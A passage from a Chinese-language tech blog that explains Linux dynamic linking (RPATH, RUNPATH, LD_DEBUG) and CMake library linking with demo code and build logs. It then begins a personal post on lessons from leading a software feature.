LD_LIBRARY_PATH ，会导致调试过程中无法轻松加载不同路径下的动态库（只能固定取到 RPATH 路径下的那个库），后续才引入了 RUNPATH ，以允许在程序运行期间通过 LD_LIBRARY_PATH 覆盖编译时设定的动态库路径。\n这两个东东的新旧顺序，也从我们的编译选项中可以看出来——默认情况下使用的是 rpath ，而通过使用新版标签 --enable-new-dtags 来启用 runpath 。假如说编译器是比较新的，则默认情况下使用的是 runpath ，用编译选项 --disable-new-dtags 禁用掉新版标签来回退到 rpath 。\n2.4.2 LD_DEBUG 我们可以通过 LD_DEBUG 环境变量来控制链接器输出动态链接过程中的相关信息。通过将它的值设为 help 并运行任意程序来查看它的使用说明：\n$ LD_DEBUG=help ls Valid options for the LD_DEBUG environment variable are: libs display library search paths reloc display relocation processing files display progress for input file symbols display symbol table processing bindings display information about symbol binding versions display version dependencies scopes display scope information all all previous options combined statistics display relocation statistics unused determined unused DSOs help display this help message and exit To direct the debugging output into a file instead of standard output a filename can be specified using the LD_DEBUG_OUTPUT environment variable. 将该变量设置为说明中给出的不同值，就能得到不同的输出。例如，值 libs 会打印动态链接库的搜索路径，则我们尝试通过指定 LD_DEBUG=libs 并运行 main 来观察我们的随机数库是怎么被找到的：\n# 首先观察 RPATH 版本 $ g++ main.cpp -L. -lgetrd -Wl,-rpath,./ -o main $ LD_DEBUG=libs ./main 17058: find library=libgetrd.so [0]; searching 17058: search path=./tls/x86_64:./tls:./x86_64:. (RPATH from file ./main) 17058: trying file=./tls/x86_64/libgetrd.so 17058: trying file=./tls/libgetrd.so 17058: trying file=./x86_64/libgetrd.so 17058: trying file=./libgetrd.so 17058: 17058: find library=libstdc++.so.6 [0]; searching # ====== 以下省略若干行 ====== # 再观察 RUNPATH 版本 $ g++ main.cpp -L. -lgetrd -Wl,-rpath,./,--enable-new-dtags -o main $ LD_DEBUG=libs ./main 20474: find library=libgetrd.so [0]; searching 20474: search path=/opt/rh/devtoolset-8/root/usr/lib64/tls/x86_64:/opt/rh/devtoolset-8/root/usr/lib64/tls:/opt/rh/devtoolset-8/root/usr/lib64/x86_64:/opt/rh/devtoolset-8/root/usr/lib64:/opt/rh/devtoolset-8/root/usr/lib/tls/x86_64:/opt/rh/devtoolset-8/root/usr/lib/tls:/opt/rh/devtoolset-8/root/usr/lib/x86_64:/opt/rh/devtoolset-8/root/usr/lib:/opt/rh/devtoolset-8/root/usr/lib64/dyninst/tls/x86_64:/opt/rh/devtoolset-8/root/usr/lib64/dyninst/tls:/opt/rh/devtoolset-8/root/usr/lib64/dyninst/x86_64:/opt/rh/devtoolset-8/root/usr/lib64/dyninst:/opt/rh/devtoolset-8/root/usr/lib/dyninst/tls/x86_64:/opt/rh/devtoolset-8/root/usr/lib/dyninst/tls:/opt/rh/devtoolset-8/root/usr/lib/dyninst/x86_64:/opt/rh/devtoolset-8/root/usr/lib/dyninst (LD_LIBRARY_PATH) 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib64/tls/x86_64/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib64/tls/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib64/x86_64/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib64/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib/tls/x86_64/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib/tls/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib/x86_64/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib64/dyninst/tls/x86_64/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib64/dyninst/tls/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib64/dyninst/x86_64/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib64/dyninst/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib/dyninst/tls/x86_64/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib/dyninst/tls/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib/dyninst/x86_64/libgetrd.so 20474: trying file=/opt/rh/devtoolset-8/root/usr/lib/dyninst/libgetrd.so 20474: search path=./tls/x86_64:./tls:./x86_64:. (RUNPATH from file ./main) 20474: trying file=./tls/x86_64/libgetrd.so 20474: trying file=./tls/libgetrd.so 20474: trying file=./x86_64/libgetrd.so 20474: trying file=./libgetrd.so 20474: 20474: find library=libstdc++.so.6 [0]; searching # ====== 以下省略若干行 ====== 两次不同的输出充分反映了 RPATH 、 LD_LIBRARY_PATH 和 RUN_PATH 的搜索顺序。\n3 CMake与动态链接库 由于我所在的项目中已经不使用原始的编译命令，前文提及的 -L 也好、-rpath 也好，在日常工作中都无法感知了。当前使用较多的构建工具是 CMake ，因此想探寻一下前文内容在 CMake 中的体现。如果读者朋友平时不用 CMake ，可直接略过本节。\n3.1 制作动态库 通过 cmake官方文档 我们知道，可以通过下面这句简单的命令来生成一个库：\nadd_library(\u0026lt;name\u0026gt; [STATIC | SHARED | MODULE] [EXCLUDE_FROM_ALL] [\u0026lt;source\u0026gt;...]) 这里指定的 \u0026lt;name\u0026gt; 会被自动纳入编译对象中，在Linux环境下会编译得到 lib\u0026lt;name\u0026gt;.a 或 lib\u0026lt;name\u0026gt;.so ；将标记设置为 SHARED ，就可以使我们编译得到的对象是一个动态库；将标记设置为 STATIC ，就可以使我们编译得到的对象是一个静态库，二者的区别已在 第0节 进行了简单介绍。 MODULE 标记用于编译模块化库，这种库一般由程序本身主动通过 dlopen 等方式来加载，本文不予探究。\n现在对我们的demo进行一些小的改动，在源文件之外再添加一份 CMakeLists.txt ，然后创建一个 build 目录用于容纳后续的编译产物。\n$ tree /home/dg/exp/ /home/dg/exp/ |-- build |-- CMakeLists.txt |-- get_random.cpp |-- get_random.h `-- main.cpp 1 directory, 4 files 在 CMakeLists.txt 中，我们准备把 get_random.cpp 编译成 libgetrd.so ：\nPROJECT(DEMO) # 设置c++编译器为g++ set(CMAKE_CXX_COMPILER /opt/rh/devtoolset-8/root/usr/bin/g++) # 开启编译时的详细输出，好让我们知道一会儿发生了什么 set(CMAKE_VERBOSE_MAKEFILE ON) # 动态库的源码路径，跟 CMakeLists.txt 在同级目录 SET(SRC_DIR ${CMAKE_CURRENT_SOURCE_DIR}) # 编译对象 getrd ADD_LIBRARY(getrd SHARED ${SRC_DIR}/get_random.cpp) 直接准备编译：\n$ pwd /home/dg/exp/build $ cmake .. ====== 省略若干行 ===== -- Configuring done -- Generating done -- Build files have been written to: /home/dg/exp/build $ make getrd /usr/local/bin/cmake -S/home/dg/exp -B/home/dg/exp/build --check-build-system CMakeFiles/Makefile.cmake 0 make -f CMakeFiles/Makefile2 getrd make[1]: Entering directory \u0026#39;/home/dg/exp/build\u0026#39; /usr/local/bin/cmake -S/home/dg/exp -B/home/dg/exp/build --check-build-system CMakeFiles/Makefile.cmake 0 /usr/local/bin/cmake -E cmake_progress_start /home/dg/exp/build/CMakeFiles 2 make -f CMakeFiles/Makefile2 CMakeFiles/getrd.dir/all make[2]: Entering directory \u0026#39;/home/dg/exp/build\u0026#39; make -f CMakeFiles/getrd.dir/build.make CMakeFiles/getrd.dir/depend make[3]: Entering directory \u0026#39;/home/dg/exp/build\u0026#39; cd /home/dg/exp/build \u0026amp;\u0026amp; /usr/local/bin/cmake -E cmake_depends \u0026#34;Unix Makefiles\u0026#34; /home/dg/exp /home/dg/exp /home/dg/exp/build /home/dg/exp/build /home/dg/exp/build/CMakeFiles/getrd.dir/DependInfo.cmake --color= make[3]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; make -f CMakeFiles/getrd.dir/build.make CMakeFiles/getrd.dir/build make[3]: Entering directory \u0026#39;/home/dg/exp/build\u0026#39; [ 50%] Building CXX object CMakeFiles/getrd.dir/get_random.o /opt/rh/devtoolset-8/root/usr/bin/g++ -Dgetrd_EXPORTS -fPIC -MD -MT CMakeFiles/getrd.dir/get_random.o -MF CMakeFiles/getrd.dir/get_random.o.d -o CMakeFiles/getrd.dir/get_random.o -c /home/dg/exp/get_random.cpp [100%] Linking CXX shared library libgetrd.so /usr/local/bin/cmake -E cmake_link_script CMakeFiles/getrd.dir/link.txt --verbose=1 /opt/rh/devtoolset-8/root/usr/bin/g++ -fPIC -shared -Wl,-soname,libgetrd.so -o libgetrd.so CMakeFiles/getrd.dir/get_random.o make[3]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; [100%] Built target getrd make[2]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; /usr/local/bin/cmake -E cmake_progress_start /home/dg/exp/build/CMakeFiles 0 make[1]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; 由于在 CMakeLists.txt 中开启了编译时的详细输出，我们完全可以知道我们的一句 ADD_LIBRARY 最后自动演变成了怎样的编译命令：\n[ 50%] Building CXX object CMakeFiles/getrd.dir/get_random.o /opt/rh/devtoolset-8/root/usr/bin/g++ -Dgetrd_EXPORTS -fPIC -MD -MT CMakeFiles/getrd.dir/get_random.o -MF CMakeFiles/getrd.dir/get_random.o.d -o CMakeFiles/getrd.dir/get_random.o -c /home/dg/exp/get_random.cpp [100%] Linking CXX shared library libgetrd.so /usr/local/bin/cmake -E cmake_link_script CMakeFiles/getrd.dir/link.txt --verbose=1 /opt/rh/devtoolset-8/root/usr/bin/g++ -fPIC -shared -Wl,-soname,libgetrd.so -o libgetrd.so CMakeFiles/getrd.dir/get_random.o 这里发生的事情，跟此前我们一句 g++ get_random.cpp -fPIC -shared -o libgetrd.so 所做的基本一致，无非是将编译过程展开并增加了一些中间产物。源文件首先被编译成 .o 文件，然后再将所有依赖（在我们的例子中并没有其他依赖）链接得到 .so 文件。\n3.2 使用动态库 仍然根据 CMake官方文档 得知如何在编译过程中链接动态库：\ntarget_link_libraries(\u0026lt;target\u0026gt; ... \u0026lt;item\u0026gt;... ...) 我们在主程序的编译过程中链接 libgetrd.so ：\nPROJECT(DEMO) # 设置c++编译器为g++ set(CMAKE_CXX_COMPILER /opt/rh/devtoolset-8/root/usr/bin/g++) # 开启编译时的详细输出，好让我们知道一会儿发生了什么 set(CMAKE_VERBOSE_MAKEFILE ON) # 动态库和主程序的源码路径，跟 CMakeLists.txt 在同级目录 SET(SRC_DIR ${CMAKE_CURRENT_SOURCE_DIR}) # 编译对象 getrd ADD_LIBRARY(getrd SHARED ${SRC_DIR}/get_random.cpp) # 编译主程序 ADD_EXECUTABLE(main ${SRC_DIR}/main.cpp) # 主程序要链接getrd TARGET_LINK_LIBRARIES(main getrd) $ cmake .. ===== 输出省略 ===== $ make main ===== 省略若干行 ===== [ 50%] Built target getrd ===== 省略若干行 ===== [ 75%] Building CXX object CMakeFiles/main.dir/main.o /opt/rh/devtoolset-8/root/usr/bin/g++ -MD -MT CMakeFiles/main.dir/main.o -MF CMakeFiles/main.dir/main.o.d -o CMakeFiles/main.dir/main.o -c /home/dg/exp/main.cpp [100%] Linking CXX executable main /usr/local/bin/cmake -E cmake_link_script CMakeFiles/main.dir/link.txt --verbose=1 /opt/rh/devtoolset-8/root/usr/bin/g++ -rdynamic CMakeFiles/main.dir/main.o -o main -Wl,-rpath,/home/dg/exp/build libgetrd.so make[3]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; [100%] Built target main make[2]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; /usr/local/bin/cmake -E cmake_progress_start /home/dg/exp/build/CMakeFiles 0 make[1]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; 可以看到，生成 main 的编译命令跟前几节里手动编译的命令基本一致：\n# 2.3.1小节里使用的编译命令 $ g++ main.cpp -L. -lgetrd -Wl,-rpath,./ -o main # 通过 CMake TARGET_LINK_LIBRARIES 自动生成的编译命令 /opt/rh/devtoolset-8/root/usr/bin/g++ -rdynamic CMakeFiles/main.dir/main.o -o main -Wl,-rpath,/home/dg/exp/build libgetrd.so 值得注意的是，由于我们在同一个CMake项目中通过 ADD_LIBRARY 制作了一个动态库，又通过 TARGET_LINK_LIBRARIES 使主程序链接了这个动态库，每次编译时会自动重新生成这个动态库以保证库是最新的，体现在 make main 的输出当中： [ 50%] Built target getrd 。\n考虑另一种场景，假如我们使用的不是自己生成的动态库，而是周边预先提供的动态库，又如何呢？\n我们先稍稍更改目录结构，把 libgetrd.so 放到源文件同级目录下：\n$ tree /home/dg/exp/ /home/dg/exp/ |-- build |-- CMakeLists.txt |-- get_random.cpp |-- get_random.h |-- libgetrd.so `-- main.cpp 1 directory, 5 files 然后在 CMakeLists.txt 里删除 ADD_LIBRARY ，表明这个库现在不由我们提供：\nPROJECT(DEMO) # 设置c++编译器为g++ set(CMAKE_CXX_COMPILER /opt/rh/devtoolset-8/root/usr/bin/g++) # 开启编译时的详细输出，好让我们知道一会儿发生了什么 set(CMAKE_VERBOSE_MAKEFILE ON) # 主程序的源码路径，跟 CMakeLists.txt 在同级目录 SET(SRC_DIR ${CMAKE_CURRENT_SOURCE_DIR}) # 编译主程序 ADD_EXECUTABLE(main ${SRC_DIR}/main.cpp) # 主程序要链接getrd TARGET_LINK_LIBRARIES(main getrd) 愉快地编译运行！\n$ cmake .. $ make main ===== 省略若干行 ===== [100%] Linking CXX executable main /usr/local/bin/cmake -E cmake_link_script CMakeFiles/main.dir/link.txt --verbose=1 /opt/rh/devtoolset-8/root/usr/bin/g++ -rdynamic CMakeFiles/main.dir/main.cpp.o -o main -lgetrd /opt/rh/devtoolset-8/root/usr/libexec/gcc/x86_64-redhat-linux/8/ld: cannot find -lgetrd collect2: error: ld returned 1 exit status make[3]: *** [CMakeFiles/main.dir/build.make💯 main] Error 1 make[3]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; make[2]: *** [CMakeFiles/Makefile2:86: CMakeFiles/main.dir/all] Error 2 make[2]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; make[1]: *** [CMakeFiles/Makefile2:93: CMakeFiles/main.dir/rule] Error 2 make[1]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; make: *** [Makefile:127: main] Error 2 oho，似乎缺少了一点东西。\n实际上，正如我们在 第一节 当中所说的，我们需要在编译时告诉编译器应该去哪里找动态库，在CMake中，承担这个任务的是 target_link_directories 。\n# 设置c++编译器为g++ set(CMAKE_CXX_COMPILER /opt/rh/devtoolset-8/root/usr/bin/g++) # 开启编译时的详细输出，好让我们知道一会儿发生了什么 set(CMAKE_VERBOSE_MAKEFILE ON) # 主程序的源码路径，跟 CMakeLists.txt 在同级目录 SET(SRC_DIR ${CMAKE_CURRENT_SOURCE_DIR}) # 编译主程序 ADD_EXECUTABLE(main ${SRC_DIR}/main.cpp) # 指定动态库的路径，跟 CMakeLists.txt 在同级目录 TARGET_LINK_DIRECTORIES(main PUBLIC ${SRC_DIR}) # 主程序要链接getrd TARGET_LINK_LIBRARIES(main getrd) $ cmake .. $ make main ===== 省略若干行 ===== [ 50%] Linking CXX executable main /usr/local/bin/cmake -E cmake_link_script CMakeFiles/main.dir/link.txt --verbose=1 /opt/rh/devtoolset-8/root/usr/bin/g++ -rdynamic CMakeFiles/main.dir/main.o -o main -L/home/dg/exp -Wl,-rpath,/home/dg/exp -lgetrd make[3]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; [100%] Built target main make[2]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; /usr/local/bin/cmake -E cmake_progress_start /home/dg/exp/build/CMakeFiles 0 make[1]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; TARGET_LINK_DIRECTORIES 在我们的编译命令当中增加了 -L 参数，指定了动态库的搜索路径，帮助我们顺利找到了 libgetrd.so 。\n3.3 动态库依赖传递 主程序依赖动态库——动态库的实现又依赖另一个动态库，这是很常见的事。在一个复杂的系统中，我们的业务程序已经不知道位于多么高的层次了，下层的动态库总是搭建在很多更下层的基础库上的。\n对我们的demo进行一些小小的改造，现在我们的主程序不再使用 GetRandom 来获取单个随机数了，而通过 libgetrdlist.so 当中定义的 GetRandomListOfSize(size_t) 来获取一个随机数的 vector ，而这个库的实现就只是通过多次调用 libgetrd.so 当中定义的 GetRandom 来生成随机数。\n// get_random_list.cpp #include \u0026#34;get_random_list.h\u0026#34; #include \u0026#34;get_random.h\u0026#34; #include \u0026lt;vector\u0026gt; std::vector\u0026lt;int\u0026gt; GetRandomListOfSize(size_t size) { std::vector\u0026lt;int\u0026gt; res; constexpr size_t MAX_LIST_SIZE = 10; // 规定随机数列表的最大长度不超过10 while ((size-- \u0026gt; 0) \u0026amp;\u0026amp; (res.size() \u0026lt; MAX_LIST_SIZE)) { res.push_back(GetRandom()); } return res; } // main.cpp #include \u0026lt;iostream\u0026gt; #include \u0026#34;get_random_list.h\u0026#34; int main() { auto randomList = GetRandomListOfSize(5); std::cout \u0026lt;\u0026lt; \u0026#34;Random list: \u0026#34;; for (const auto \u0026amp;r : randomList) { std::cout \u0026lt;\u0026lt; r \u0026lt;\u0026lt; \u0026#39; \u0026#39;; } std::cout \u0026lt;\u0026lt; std::endl; return 0; } 源码列表当中增加了两个文件，一个 libs 目录用来放置我们的动态库：\n$ tree /home/dg/exp/ /home/dg/exp/ |-- build |-- CMakeLists.txt |-- get_random.cpp |-- get_random.h |-- get_random_list.cpp |-- get_random_list.h |-- libs | `-- libgetrd.so `-- main.cpp 2 directories, 7 files 生成 libgetrdlist.so 的 CMakeLists.txt 用的均是本节介绍过的东西：\nPROJECT(DEMO) # 设置c++编译器为g++ set(CMAKE_CXX_COMPILER /opt/rh/devtoolset-8/root/usr/bin/g++) # 开启编译时的详细输出，好让我们知道一会儿发生了什么 set(CMAKE_VERBOSE_MAKEFILE ON) # 主程序的源码路径，跟 CMakeLists.txt 在同级目录 SET(SRC_DIR ${CMAKE_CURRENT_SOURCE_DIR}) # 动态库的路径，在 CMakeLists.txt 同级目录的 libs 目录下 SET(LIB_DIR ${CMAKE_CURRENT_SOURCE_DIR}/libs) # 编译 getrdlist ADD_LIBRARY(getrdlist SHARED ${SRC_DIR}/get_random_list.cpp) TARGET_LINK_DIRECTORIES(getrdlist PUBLIC ${LIB_DIR}) TARGET_LINK_LIBRARIES(getrdlist getrd) $ cmake .. $ make getrdlist ===== 省略若干行 ===== [100%] Linking CXX shared library libgetrdlist.so /usr/local/bin/cmake -E cmake_link_script CMakeFiles/getrdlist.dir/link.txt --verbose=1 /opt/rh/devtoolset-8/root/usr/bin/g++ -fPIC -shared -Wl,-soname,libgetrdlist.so -o libgetrdlist.so CMakeFiles/getrdlist.dir/get_random_list.o -L/home/dg/exp/libs -Wl,-rpath,/home/dg/exp/libs -lgetrd make[3]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; [100%] Built target getrdlist make[2]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; /usr/local/bin/cmake -E cmake_progress_start /home/dg/exp/build/CMakeFiles 0 make[1]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; 我们把编译得到的 libgetrdlist.so 也挪到动态库的路径下，然后在 CMakeLists.txt 里把相关的编译指令删掉，还是只保留编译主程序的内容。\nPROJECT(DEMO) # 设置c++编译器为g++ set(CMAKE_CXX_COMPILER /opt/rh/devtoolset-8/root/usr/bin/g++) # 开启编译时的详细输出，好让我们知道一会儿发生了什么 set(CMAKE_VERBOSE_MAKEFILE ON) # 主程序的源码路径，跟 CMakeLists.txt 在同级目录 SET(SRC_DIR ${CMAKE_CURRENT_SOURCE_DIR}) # 动态库的路径，在 CMakeLists.txt 同级目录的 libs 目录下 SET(LIB_DIR ${CMAKE_CURRENT_SOURCE_DIR}/libs) # 编译主程序 ADD_EXECUTABLE(main ${SRC_DIR}/main.cpp) # 指定动态库的路径 TARGET_LINK_DIRECTORIES(main PUBLIC ${LIB_DIR}) # 主程序要链接getrdlist TARGET_LINK_LIBRARIES(main getrdlist) $ cmake .. $ make main ===== 省略若干行 ===== [100%] Linking CXX executable main /usr/local/bin/cmake -E cmake_link_script CMakeFiles/main.dir/link.txt --verbose=1 /opt/rh/devtoolset-8/root/usr/bin/g++ -rdynamic CMakeFiles/main.dir/main.o -o main -L/home/dg/exp/libs -Wl,-rpath,/home/dg/exp/libs -lgetrdlist -lgetrd make[3]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; [100%] Built target main make[2]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; /usr/local/bin/cmake -E cmake_progress_start /home/dg/exp/build/CMakeFiles 0 make[1]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; 我们发现了一个怪异的现象：在编译 main 的命令中，把 libgetrd.so 这个最底层的库也带上了。\n由此引出了 动态库依赖传递 的概念。在 target_link_libraries 中，可以通过 PUBLIC 、 PRIVATE 和 INTERFACE 来指定动态库是否将自己的依赖传递给使用者，我们编译 libgetrdlist.so 时并没有指定这些关键字，默认地将 libgetrd.so 这个依赖传递给了 main 。\n尝试将 libgetrd.so 的依赖改为 PRIVATE ：\n==== 省略若干行 ==== # 编译 getrdlist ADD_LIBRARY(getrdlist SHARED ${SRC_DIR}/get_random_list.cpp) TARGET_LINK_DIRECTORIES(getrdlist PRIVATE ${LIB_DIR}) TARGET_LINK_LIBRARIES(getrdlist PRIVATE getrd) 拿着编译出来的 libgetrdlist.so 来编译 main ：\n$ make main ===== 省略若干行 ===== [100%] Linking CXX executable main /usr/local/bin/cmake -E cmake_link_script CMakeFiles/main.dir/link.txt --verbose=1 /opt/rh/devtoolset-8/root/usr/bin/g++ -rdynamic CMakeFiles/main.dir/main.o -o main -L/home/dg/exp/libs -Wl,-rpath,/home/dg/exp/libs -lgetrdlist make[3]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; [100%] Built target main make[2]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; /usr/local/bin/cmake -E cmake_progress_start /home/dg/exp/build/CMakeFiles 0 make[1]: Leaving directory \u0026#39;/home/dg/exp/build\u0026#39; 在编译命令中已经看不到 libgetrd.so 的字样，说明这次修改成功将底层的依赖隐藏了。实际上，CMake文档中给出的建议是，假如一个依赖库只用于上层库的实现，那么就在 target_link_libraries 当中设置 PRIVATE 关键字；假如一个依赖库不仅用于上层库的实现，还用于上层库的头文件中，那么就应该将关键字设置为 PUBLIC ；最后假如一个依赖库不用于上层库的实现，而只用于头文件中，那么就将关键字设置为 INTERFACE 。\n4 小结 这篇小文本质上是基于工作中与动态库所打的交道，选取了一些自觉得有价值的知识点进行的记录。文中的言语并不太流畅，实验设计并不太精巧，不过总的还是对 rpath 、 runpath 以及动态库相关的CMake知识进行了描述和测试，比文档搬运要来得直观一些。\n由于篇幅、精力和个人能力的限制，还有很多复杂的内容没有展开，有遗漏之处、错误之处、没能满足读者的期望之处，均是欢迎指出的。\n参考资料 [1] \u0026ldquo;Anatomy of Linux dynamic libraries - IBM Developer,\u0026rdquo; , https://developer.ibm.com/tutorials/l-dynamic-libraries/\n[2] \u0026ldquo;ld.so(8) - Linux manual page\u0026rdquo;, https://www.man7.org/linux/man-pages/man8/ld.so.8.html\n[3] 福豹, Runtime：RPATH/LD_LIBRARY_PATH/RUNPATH, https://zhuanlan.zhihu.com/p/534778561\n[4] \u0026ldquo;The LD_DEBUG environment variable | B. Nikolic Software and Computing Blog,\u0026rdquo; Bnikolic, https://bnikolic.co.uk/blog/linux-ld-debug.html\n[5] \u0026ldquo;add_library — CMake 3.26.3 Documentation,\u0026rdquo; Cmake, https://cmake.org/cmake/help/latest/command/add_library.html\n[6] \u0026ldquo;target_link_libraries — CMake 3.26.3 Documentation,\u0026rdquo; Cmake, https://cmake.org/cmake/help/latest/command/target_link_libraries.html\n[7] \u0026ldquo;target_link_directories — CMake 3.26.3 Documentation,\u0026rdquo; Cmake, https://cmake.org/cmake/help/latest/command/target_link_directories.html#command:target_link_directories\n[8] \u0026ldquo;cmake-buildsystem(7) — CMake 3.26.3 Documentation,\u0026rdquo; Cmake, https://cmake.org/cmake/help/latest/manual/cmake-buildsystem.7.html#target-usage-requirements\n","date":"2023-04-09T00:00:00Z","permalink":"https://xrg.fj.cn/p/linux%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E4%BA%8C%E4%B8%89%E4%BA%8B/","title":"Linux动态链接二三事"},{"content":"一个月前，被领导委派成为一个小特性的负责人，在我司的术语叫做 Feature Owner (FO) 的，给我平平无奇的人生又增加了一点毫不出彩的经历。\n由于是第一次做这么一个脚色，又托大并未去参考什么前辈经验，在前期实在是连滚带爬了好一阵子，很是狼狈。回顾所来，还是有一点心得体会要写的，不过我写在这里，不管对与不对，总还是会有许多如我一般丝毫不去找前人经验的新人FO在，故这些文字，大约并不为多少人所读到，多是仅供自娱而已。\n1 起手式：版本 特性负责人，其实就是除了开发工作之外，还要负责起整个特性的前期计划、进度跟踪、后期联调和最终交付的角色。不同特性要求负责人在各个环节的投入比重差异实在很大，难以有一个普适的套路。\n就我负责的特性而言，我所要做的开发工作很少，主要是整合周边组件提供的功能；然而由于周边组件很多，就要求我要投入多数的时间用于总体计划的协商对齐上。开发岗位的惯性使我一开始忽略了计划的对齐，导致前期拟定的计划不断地出现缺漏——甚至于我自己的开发工作完成后，还是没有跟周边组件定下一个稳定可行的联调计划——整个特性前中期每天都处于一个高风险的状态，我的心绪也一直无法安宁下来，深受其害。\n由此我得到的经验是，特性负责人所要确定的第一个问题就是版本问题——确定双方版本、我们负责的新特性要在哪个周边版本联调、周边特性打算在哪个版本交付、最终要在我们的哪个版本集成。\n我们当前用的是周边的什么版本、周边当前又已演进到什么版本。这是一个首要的问题。不认识这一点，就不能明白对方的开发基础和我们现有的基础之间的差异。假如对方的版本和我方的版本一致，那就可以轻松实现对接；假如对方的版本领先于我方版本，那就需要考虑兼容的问题，即对方新开发的功能，并不一定能直接迁移到我们现有的版本上。\n图1-1 双方版本配套：舒适地演进 图1-2 双方版本不配套的情况：对方特性未必可以迁移 我们的新特性要在哪个版本联调。当我们确定了当前使用的周边版本之后，要进一步确定联调版本。最舒适的做法是让周边组件基于我们当前使用的版本拉出一个新的代码分支，并将他们新开发的功能合入这个联调分支上，提供联调版本。这样的联调版本我们基本没有适配压力，可以开箱即用，是最佳选择。\n图1-3 联调版本集成 不过，很容易由于双方版本差距过大，以至于对方提出无法将功能合入老版本的代码上；这个时候，最好表现出我们作为特性负责人的强势，要求对面克服困难提供联调版本。尽量不要随便答应使用对方的新版本联调，因为对于我方来说，将周边版本升级是一个更加复杂的过程，涉及的方面远不只限于我们的特性本身，最终还是有很大概率不断地回到起点去重新制定联调计划，反而不如一开始就让对方基于我们现有的版本去合入新特性。\n我的这个小特性，正是由于联调计划迟迟无法对齐，导致开发完成之后无法立即启动联调。周边组件为了免除将新特性及其依赖功能合入旧版本的额外工作，提出了各种基于他们最新版本的联调方案，我方也花费了很多精力去开展这种本就风险很大的联调，最终将各组件拆的七零八落，也只能勉强地调一小部分功能，一直苟延残喘到我方正式对周边的新版本进行了适配，才做出一个比较完整的联调版本来。\n图1-4 最稳妥的联调方案：周边将新特性回合老版本 周边特性打算在哪个版本交付、最终要在我们的哪个版本集成。各方都完成功能开发后，随着版本演进，自然会有一个版本集成了全部的功能，但问题在于一个特性的交付是有DDL的，我们要确保在DDL之前能够完整集成所有功能，就要确定双方的版本计划。\n以我的这个小特性来说，原先要求在 3-30 交付，由于早期没有对好版本计划，有一个组件交付在他们的 3-25 的版本上，而我们对这个版本的集成计划已经排到了 四月份之后！\n图1-5 版本集成节奏不满足特性交付需求 这样的问题在后期一出现，基本宣告特性延期交付。合理的做法是前期对好计划之后，就要告知周边尽快将特性交付到当前的版本上，才有可能在我方发布版本时集成所有功能。\n2 进阶式：求助 打好版本这套起手式，就足够装作老师傅了，此时整体特性的交付风险就将相当可控。不过，作为一个特性负责人，自己包办一切是不现实的，有非常多的东西在我们知识及能力范围之外，这时及时求助就会非常重要。按我的经历说来，下面几个角色是不可不打交道的。\n周边特性负责人。通常在跨部门的特性中，周边组件也会有特性负责人，不管是版本计划、周边进展、合作联调，都可以找这个负责人商议，即使TA搞不定这些问题，也会帮我们找到具体能解决问题的人物。\n我方 +1 +2 。特性不大的情况下，找上级或上上级就基本能摆平我们遇到的多数问题，他们会用丰富的经验帮我们把控当前的风险，以及在大佬比较多、问题比较复杂的会议上帮我们稳住节奏和心态。\n我方版本角色。玩版本的人都是狠人，我们的起手式里其实有相当多环节都可以请我方版本角色帮忙搞定，例如确定我方和周边的版本配套关系、商定联调版本的计划、确定我们的正式交付计划等等。这种问题，很大概率 +1 +2 也并不特别了解，如果在我们的求助列表中缺失了版本角色，就容易带着他们一起在版本问题上翻车（你猜猜这个教训从何而来）。\n我做这个小特性，既没把版本玩明白，又没在前期找准求助的对象，导致积重难返，延期交付，真是悲剧。\n3 终式：厚脸皮 